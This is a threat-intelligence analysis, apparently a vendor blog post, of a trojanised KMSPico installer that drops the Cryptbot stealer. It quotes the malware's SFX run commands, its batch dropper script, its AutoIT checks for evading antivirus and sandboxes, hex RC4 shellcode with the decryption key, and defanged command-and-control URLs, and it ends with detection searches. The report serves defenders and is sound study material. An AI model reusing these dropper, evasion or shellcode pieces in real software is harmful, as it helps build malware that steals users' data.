You can find a copy of the same installer on VirusTotal if](https://www.virustotal.com/gui/file/98804d3117f46ca5c6e97cdd2573d6f7ada0a0cbb347573655ea67d0705d52d5)\n\n[you want to play along at home. For more information on KMSpico and how it relates to Cryptbot, read our public article posted on the](https://redcanary.com/blog/kmspico/)\n\nRed Canary blog.\n\nThis KMSPico installer is a self-extracting executable (SFX) seemingly built with something like 7-Zip. During our analysis, we noted\n\nthat the adversary password-protected the executable and distributed it with a “password.txt” file containing the text official\nkmspico[.]com.\n\n**[Documentation about SFX installers reveals the files are really a combination of a few components:](https://sevenzip.osdn.jp/chm/cmdline/switches/sfx.htm)**\n\n   - 7-Zip SFX module that executes attached content\n\n   - plaintext configuration file that specifies additional commands\n\n   - 7-Zip archive containing the files for the installer to work with\n\nIn addition, the documentation suggests that a configuration stanza should start with text like ”@!UTF-8!”. By parsing through the\n\nbytes of the installer file with a hex editor, we located the configuration stanza for this particular sample:\n\n;!@kLCqTRp@!UTF-8!\n```\nGUIMode=”2”\n\n```\nOverwriteMode=”1”\n\nRunProgram=”forcenowait:4.scr”\n\nRunProgram=”hidcon:cmd /c cmd < Pensai.vsd”\n```\n;!@kLCqTRpEnd@!\n\n```\nAccording to the configuration file, two commands are executed at runtime: 4.scr and cmd.exe /c cmd < Pensai.vsd. Later\n\n[analysis determined that 4.scr was the legitimate KMSpico installer, while the other command ultimately led to the installation of](https://www.virustotal.com/gui/file/64c731adbe1b96cb5765203b1e215093dcf268d020b299445884a4ae62ed2d3a)\n\nCryptbot. During execution, the installer unpacked a “Pensai.vsd” file and executed it using cmd.exe.\n\n[After parsing out the configuration, we also obtained the original 7-Zip archive file attached to the installer by searching for the magic](https://forensicitguy.github.io/extracting-sfx-installer/)\n\nbytes of a 7Z archive (37 7A BC AF 27 1C) and extracting the bytes from this header until the end of the file. We then extracted\n\nthe contents using the password as needed. The extracted files included:\n\n   - Pensai.vsd (a .bat script)\n\n   - Copriva.vsd (a renamed instance of the AutoIT runtime missing a MZ header)\n\n   - Svelto.vsd (an obfuscated AutoIT script)\n\n   - Talismani.vsd (a RC4-encrypted Cryptbot binary)\n\n\n**[VirusTotal if](https://www.virustotal.com/gui/file/98804d3117f46ca5c6e97cdd2573d6f7ada0a0cbb347573655ea67d0705d52d5)**\n\n**[article posted on the](https://redcanary.com/blog/kmspico/)**\n\n\n-----\n\n## CypherIT crypter system\n\nAs we dug deeper into analysis, we noted components of the malware that overlapped with a CypherIT that other vendors have\n\nobserved in combination with multiple malware families in recent years.\n\nWe found the first overlap in the extracted Pensai.vsd script content:\n\nif %userdomain%==DESKTOP-QO5QU33 exit 1\n\n<nul set /p = “MZ” > Partito.exe.com\n\nfindstr /V /R “^LudVevuvObtrrfCxlJsmGrKQFdEElODNLiWdFAzNjzXHSiHjbnHmtuMIcAdLSCkZUdaWzjPKdEjjur\n\nXnJsuLirJEcgVtlIVKiXMCPLTk$” Copriva.vsd >> Partito.exe.com”\n\ncopy Svelto.vsd B\n\nstart Partito.exe.com B\n\nping 127.0.0.1 -n 30\n\nDuring execution, the sample checked to see if the computer name was DESKTOP-QO5QU33, and exited if it was. Multiple vendors have\n\nassociated this name check with malware, including:\n\n  - Minerva Labs\n\n  - Dr. Web\n\n  - Zscaler\n\n  - AhnLab\n\nAssuming the computer name is different, the sample creates “Partito.exe.com” with the contents “MZ”, which is the ASCII equivalent of\n\nhex bytes that identify a Windows executable. Then the sample issues a findstr command that returns all the content of “Copriva.vsd”\n\nexcept for a unique string at the beginning of the file. The sample appends the content to Partito.exe.com to create a complete copy of\n\n[the AutoIT tool designed to execute AutoIT scripts. Finally, the sample copies “Svelto.vsd” into a file named “B” and uses the AutoIT](https://www.autoitscript.com/site/)\n\nruntime to execute obfuscated script content.\n\nDiving deeper into the executed AutoIT script, we encountered very heavy obfuscation within the script that took multiple forms. First,\n\nthe adversary obfuscated the script using control flow obfuscation. In doing so, they introduced thousands of lines of Switch/Case\n\nstatements hardcoded to take a specific path for execution while the extra statements visually overwhelm folks analyzing the malware.\n\n\n-----\n\n_Obfuscated AutoIT code_\n\nSecond, the adversary obfuscated the script using extraneous garbage code to purposely slow analysis. This takes the form of\n\nadditional mathematical operations, boolean logic, and variable assignments. In addition, the adversary introduced several unneeded\n\nfunctions within the code. Finally, the script obfuscates strings using a modified Caesar Cipher and string reversal. The adversary\n\nimplemented a function to take in a string containing decimal values, split it on preset characters, shift the decimal values by a specified\n\nkey, and output the shifted decimal numbers as Unicode characters.\n\nIn practice, the calls to the deobfuscation function look similar to:\n\nXsqTp(“74@89@112@102@42@108@101@114@80@124@43”,2).\n\nOnce we removed most of the obfuscation we found more system checks, this time to avoid sandboxes or AV emulation.\n\nIf Execute(“EnvGet(‘COMPUTERNAME’)”) = “DESKTOP-QO5QU33” Then\n\nExecute(“WinClose(AutoItWinGetTitle())”)\n\nIf (Execute(“EnvGet(‘COMPUTERNAME’)”) = “NfZtFbPfH”) Then\n\nExecute(“WinClose(AutoItWinGetTitle())”)\n\nIf (Execute(“EnvGet(‘COMPUTERNAME’)”) = “tz”) Then Execute(“WinClose(AutoItWinGetTitle())”)\n\nIf (Execute(“EnvGet(‘COMPUTERNAME’)”) = “ELICZ”) Then Execute(“WinClose(AutoItWinGetTitle())”)\n\nIf (FileExists(“C:\\aaa_TouchMeNot_.txt”)) Then Execute(“WinClose(AutoItWinGetTitle())”)\n\n[In these cases, the names corresponded with security products to avoid (Blackthorne, et al):](https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne.pdf)\n\n  - NfZtFbPfH - Kaspersky\n\ntz BitDefender\n\n\n-----\n\n  - ELICZ - AVG\n\n  - C:\\aaa_TouchMeNot_.txt - Windows Defender emulation\n\nOnce these checks are passed, the sample reads an encrypted blob from “Talismani.vsd” and decrypts it using a RC4 algorithm\n\nimplemented as shellcode. To perform the decryption, the sample used shellcode encoded as hex strings within the script:\n\nx64\n\n0x89C0554889C84889D54989CA4531C95756534883EC08C70100000000C741040000000045884A084183C1014983C2\n\n014181F90001000075EB488DB9000100004531D2664531C9EB3641BA0100000031F60FB658080FB6142E8D3413468D\n\n0C0E450FB6C94D63D9420FB6741908408870084883C00142885C19084839F8740E4539D07EC54963F24183C201EBC4\n\n4883C4085B5E5F5DC389DB56534883EC084585C0448B11448B49047E4E4183E8014A8D7402014183C2014181E2FF00\n\n00004963DA0FB6441908468D0C08450FB6C94D63D9460FB644190844884419084288441908418D04000FB6C00FB644\n\n010830024883C2014839F275BB448911448949044883C4085B5EC3\n\nx86\n\n0x89C05531C057565383EC088B4C241C8B7C2420C70100000000C74104000000008844010883C0013D0001000075F2\n\n8D910001000031DB8954240489C831D2891C2489CEEB32C704240100000031ED0FB648080FB61C2F8D2C198D541500\n\n0FB6D20FB66C160889EB88580883C001884C16083B44240474128B0C24394C24247EC58B2C2483042401EBC583C408\n\n5B5E5F5DC2100089DB5557565383EC088B5424248B44241C8B6C242085D28B188B48047E5B31D2895C2404892C248B\n\n5C240483C30181E3FF000000895C24040FB67418088B6C24048D0C0E0FB6C90FB67C080889FB885C280889F38D3437\n\n81E6FF000000885C08080FB67430088B3C2489F3301C1783C2013B54242475B089EB891889480483C4085B5E5F5DC2\n\n1000\n\nUsing an RC4 key of “02695646”, we obtained the final Cryptbot payload. Assuming the sample would continue execution, it injected the\n\nCryptbot bytes into the memory space of the running Partito.exe.com process for execution without touching disk in cleartext form.\n\n[To achieve the injection, the sample used process hollowing. This tried-and-true injection method allowed the malware to](https://redcanary.com/blog/process-injection-primer/)\n\nunmap a section of its own memory, map arbitrary bytes into the same memory space, and set the process to execute those bytes.\n\nPart of this injection process was obfuscated, but we found references to two critical calls for hollowing: VirtualAlloc and\n\nNtUnmapViewOfSection.\n\n## Identifying Cryptbot\n\n[From this point forward we analyzed the extracted Cryptbot payload. The PE import hash for this sample](https://www.virustotal.com/gui/search/imphash%253Ab75a0e10d09dc263c2f3a47cd7d7c747/files)\n\n(b75a0e10d09dc263c2f3a47cd7d7c747), which helps identify binaries with similar capabilities, overlaps with additional\n\nbinaries identified as Cryptbot on VirusTotal.

If this\n\nfolder exists, the malware will execute its self-deletion routine and the process will exit. A screenshot of the functionality is below.\n\nDuring execution, the sample creates the mentioned “Ramson” folder, making a marker that prevents reinfection after first execution.\n\n## Web Protocols (T1071.001) and Masquerading (T1036.005)\n\nWe identified sections of code that referenced network connections with external network domains. These network connections\n\nused three different domains while sharing request URI and HTTP User-Agent String properties. The indicators are listed below with a\n\nscreenshot of them called in the decompiled malware instructions.\n\nhxxp://kiyhtr74[.]top/index.php\n\nhxxp://morgon07[.]top/index.php\n\nhxxp://peomyn10[.]top/download.php?file=lv.exe\n\n\n-----\n\nAll network connections used a consistent HTTP User-Agent String of Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36. This string masquerades\n\nHTTP traffic from this process on a network and makes it appear to originate from a Google Chrome browser version 89 on Windows 10\n\nx64.\n\n## Behavioral detection shores up signature-based detection\n\n[This malware continues a trend we’ve seen in recent threats, such as Yellow Cockatoo/Jupyter. Adversaries continue to use packers,](https://redcanary.com/blog/intel-insights-sept-2021/)\n\ncrypters, and evasion methods to stymie signature-based tools such as antivirus and YARA rules. As these threats grow more complex\n\nwith their obfuscation, they must exert an equal and opposite effort to remove that same obfuscation after delivery to run the malware.\n\nDuring this delivery and obfuscation process, behavior-based detection shines and helps close gaps on malicious activity that might\n\notherwise get missed.\n\nSearching for the following helped us detect this threat:\n\n  - binaries containing AutoIT metadata but don’t have “AutoIT” in their file names\n\n  - AutoIT processes making external network connections\n\n - findstr commands similar to findstr /V /R “^ … $\n\n  - PowerShell or cmd.exe commands containing rd /s /q, timeout, and del /f /q together\n\n\n-----",
